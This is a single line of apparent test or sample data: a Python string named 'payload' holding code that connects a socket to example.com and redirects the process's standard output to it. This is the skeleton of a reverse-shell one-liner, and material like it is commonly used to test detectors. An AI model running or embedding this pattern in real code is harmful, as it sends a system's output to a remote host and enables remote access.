payload = "import socket,os;s=socket.socket();s.connect(('example.com',80));os.dup2(s.fileno(),1);print('hello')"
